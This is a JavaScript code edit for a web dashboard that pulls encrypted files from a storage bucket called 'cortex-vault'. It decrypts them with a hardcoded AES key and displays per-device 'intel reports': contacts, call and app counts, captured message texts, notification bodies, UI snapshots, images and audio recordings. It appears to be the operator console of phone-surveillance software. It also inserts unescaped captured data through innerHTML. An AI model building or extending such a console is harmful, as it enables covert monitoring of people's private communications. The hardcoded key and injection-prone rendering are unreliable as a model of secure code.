ops.replace_with:
async function viewFile(name) {
    const fullPath = currentVaultPath ? `${currentVaultPath}/${name}` : name;
    const ext = name.split('.').pop().toLowerCase();
    toast("DECRYPTING & RENDERING...", "success");

    try {
        const { data, error } = await sb.storage.from('cortex-vault').createSignedUrl(fullPath, 60);
        if (error) throw error;

        const response = await fetch(data.signedUrl);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);

        const buffer = await response.arrayBuffer();
        let contentHtml = "";
        let processedData = null;

        if (ext === 'ctx') {
            processedData = await decryptCtx(buffer);
            contentHtml = renderIntelligence(processedData);
        } else if (ext === 'gz') {
            const text = await decompressGzip(buffer);
            contentHtml = renderLogs(text);
        } else if (['jpg', 'jpeg', 'png', 'webp', 'gif'].includes(ext)) {
            const blob = new Blob([buffer]);
            contentHtml = `<img src="${URL.createObjectURL(blob)}" class="viewer-media">`;
        } else if (['m4a', 'mp3', 'wav', 'aac'].includes(ext)) {
            const blob = new Blob([buffer]);
            contentHtml = `<audio controls src="${URL.createObjectURL(blob)}" class="viewer-media" style="width:100%"></audio>`;
        } else {
            const text = new TextDecoder().decode(buffer);
            contentHtml = `<pre style="color:var(--primary); font-size:0.7rem; white-space:pre-wrap;">${text}</pre>`;
        }

        document.getElementById('status-title').innerText = `DATA_VIEWER: ${name}`;
        document.getElementById('status-content').innerHTML = contentHtml;
        document.getElementById('status-overlay').style.display = 'flex';
        toast("VIEWER_READY", "success");
    } catch (err) {
        console.error(err);
        toast("VIEWER_ERROR: " + err.message, "danger");
    }
}

async function decryptCtx(buffer) {
    const keyBytes = new TextEncoder().encode("C0rtexS3cr3tK3y!");
    const iv = buffer.slice(0, 12);
    const ciphertext = buffer.slice(12);

    const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["decrypt"]);
    const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: iv }, cryptoKey, ciphertext);

    const decompressed = await decompressGzip(decrypted);
    return JSON.parse(decompressed);
}

async function decompressGzip(buffer) {
    const ds = new DecompressionStream("gzip");
    const writer = ds.writable.getWriter();
    writer.write(buffer);
    writer.close();
    const response = new Response(ds.readable);
    return await response.text();
}

function renderIntelligence(data) {
    let html = `<div style="margin-bottom:20px; color:var(--success); border-bottom:1px solid #333; padding-bottom:10px">INTEL_REPORT: ${data.device_model || 'GENERIC'}</div>`;

    const sections = {
        "IDENTITY": data.static || {},
        "HEALTH": data.health || data.app_health || {},
        "FORENSICS": { 
            "Contacts": data.contacts?.length || 0, 
            "Calls": data.calls?.length || 0, 
            "Apps": data.apps?.length || 0 
        }
    };

    for (const [title, obj] of Object.entries(sections)) {
        html += `<h2 style="font-size:0.7rem; margin-top:15px">${title}</h2>`;
        for (const [k, v] of Object.entries(obj)) {
            if (typeof v === 'object') continue;
            html += `<div class="viewer-card"><span class="json-key">${k}:</span> <span class="json-val">${v}</span></div>`;
        }
    }
    return html;
}

function renderLogs(rawText) {
    const lines = rawText.trim().split('\n');
    return lines.map(line => {
        try {
            const obj = JSON.parse(line);
            const date = new Date(obj.d?.ts || obj.ts || Date.now()).toLocaleTimeString();
            const type = obj.t || "LOG";
            const details = obj.d || obj;

            let body = "";
            if (details.body) body = details.body;
            else if (details.txt) body = details.txt;
            else if (details.tree) body = "[UI_TREE_SNAPSHOT]";
            else body = JSON.stringify(details).substring(0, 100);

            return `
                <div class="viewer-card">
                    <span class="viewer-ts">${date}</span>
                    <span class="viewer-tag">${type}</span>
                    <div style="margin-top:5px; font-size:0.8rem;">${body}</div>
                    ${details.pkg ? `<div style="font-size:0.6rem; color:#555; margin-top:3px">Source: ${details.pkg}</div>` : ''}
                </div>`;
        } catch (e) { return `<div class="viewer-card">${line}</div>`; }
    }).join('');
}

